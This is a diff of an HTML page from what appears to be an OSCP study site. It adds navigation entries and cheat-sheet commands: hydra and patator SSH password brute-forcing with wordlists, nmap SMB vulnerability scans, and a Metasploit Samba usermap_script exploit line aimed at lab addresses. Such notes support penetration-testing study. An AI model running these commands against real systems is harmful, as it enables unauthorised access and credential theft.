@@ -3502,6 +3502,10 @@
       
         
       
+        
+      
+        
+      
     
     
       
@@ -3560,6 +3564,50 @@
   
   <span class="md-ellipsis">
     Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../oscp_tips/brute-force/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Brute Force
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../oscp_tips/credentials/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Credentials
     
   </span>
   
@@ -3874,6 +3922,7 @@ debug1:<span class="w"> </span>Next<span class="w"> </span>authentication<span c
 <span class="c1"># BruteForce:</span>
 patator<span class="w"> </span>ssh_login<span class="w"> </span><span class="nv">host</span><span class="o">=</span><span class="m">10</span>.11.1.111<span class="w"> </span><span class="nv">port</span><span class="o">=</span><span class="m">22</span><span class="w"> </span><span class="nv">user</span><span class="o">=</span>root<span class="w"> </span><span class="nv">0</span><span class="o">=</span>/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt<span class="w"> </span><span class="nv">password</span><span class="o">=</span>FILE0<span class="w"> </span>-x<span class="w"> </span>ignore:mesg<span class="o">=</span><span class="s1">&#39;Authentication failed.&#39;</span>
 hydra<span class="w"> </span>-l<span class="w"> </span>user<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/password/rockyou.txt<span class="w"> </span>-e<span class="w"> </span>s<span class="w"> </span>ssh://10.10.1.111
+hydra<span class="w"> </span>-L<span class="w"> </span>users_person<span class="w"> </span>-P<span class="w"> </span>wordlist.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>ssh://192.168.120.125<span class="w"> </span>-s<span class="w"> </span><span class="m">43022</span>
 medusa<span class="w"> </span>-h<span class="w"> </span><span class="m">10</span>.10.1.111<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/password/rockyou.txt<span class="w"> </span>-e<span class="w"> </span>s<span class="w"> </span>-M<span class="w"> </span>ssh
 ncrack<span class="w"> </span>--user<span class="w"> </span>user<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/password/rockyou.txt<span class="w"> </span>ssh://10.10.1.111
 
@@ -4998,6 +5047,9 @@ rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quo
 
 <span class="c1"># Check vulns</span>
 nmap<span class="w"> </span>--script<span class="w"> </span>smb-vuln*<span class="w"> </span>-p139,445<span class="w"> </span>-T4<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.11.1.111
+sudo<span class="w"> </span>nmap<span class="w"> </span>-p137,138,139,445<span class="w"> </span>--script<span class="o">=</span><span class="s2">&quot;smb-vuln-*&quot;</span><span class="w"> </span><span class="m">192</span>.168.139.40
+sudo<span class="w"> </span>nmap<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span>-sT<span class="w"> </span>-A<span class="w"> </span><span class="m">10</span>.10.10.40<span class="w"> </span>--script<span class="w"> </span>vuln
+
 
 <span class="c1"># Multi exploits</span>
 msfconsole<span class="p">;</span><span class="w"> </span>use<span class="w"> </span>exploit/multi/samba/usermap_script<span class="p">;</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>lhost<span class="w"> </span><span class="m">192</span>.168.0.X<span class="p">;</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>rhost<span class="w"> </span><span class="m">10</span>.11.1.111<span class="p">;</span><span class="w"> </span>run
